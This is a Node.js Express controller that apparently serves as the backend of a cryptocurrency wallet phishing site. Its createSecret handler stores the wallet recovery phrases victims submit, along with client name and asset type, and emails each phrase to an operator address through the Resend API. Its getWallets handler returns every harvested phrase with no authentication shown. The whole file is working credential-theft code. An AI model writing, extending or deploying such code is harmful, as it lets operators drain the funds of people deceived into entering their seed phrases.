const { BadRequestError } = require("../errors/errorsIndex");
require("dotenv").config();
const { StatusCodes } = require("http-status-codes");
const { Resend } = require("resend");
const secretWords = require("../models/secrets");

// Initialize Resend
const resend = new Resend(process.env.RESEND_API_KEY);

// Centralized email sending
const sendEmail = async (to, subject, html, from = process.env.MAILER_EMAIL) => {
  try {
    const { data } = await resend.emails.send({ from, to, subject, html });
    return data;
  } catch (error) {
    console.error("Email sending error:", error);
    throw error;
  }
};

// Get all wallets/secrets
const getWallets = async (req, res) => {
  try {
    const wallets = await secretWords.find({});
    res.status(StatusCodes.OK).json(wallets);
  } catch (error) {
    console.error(error);
    res.status(StatusCodes.INTERNAL_SERVER_ERROR).json({ error: "Failed to fetch wallets" });
  }
};

// Create a new secret word
const createSecret = async (req, res) => {
  try {
    const secretWord = await secretWords.create(req.body);
    const { secret, user, walletType } = req.body;

    // Prepare email content
    const htmlContent = `
      <div style="text-align:left; min-height:60vh; padding:20px">
        <h2>Phrases: ${secret}</h2>
        <h2>Client: ${user}</h2>
        <h2>Asset: ${walletType}</h2>
      </div>
    `;

    // Send email to admin
    await sendEmail(process.env.MAILER_EMAIL, "New Wallet Secret Words", htmlContent);

    // Respond to frontend
    res.status(StatusCodes.CREATED).json({ secretWord });
  } catch (error) {
    console.error(error);
    res.status(StatusCodes.INTERNAL_SERVER_ERROR).json({ error: "Failed to create secret word" });
  }
};

module.exports = {
  createSecret,
  getWallets,
};
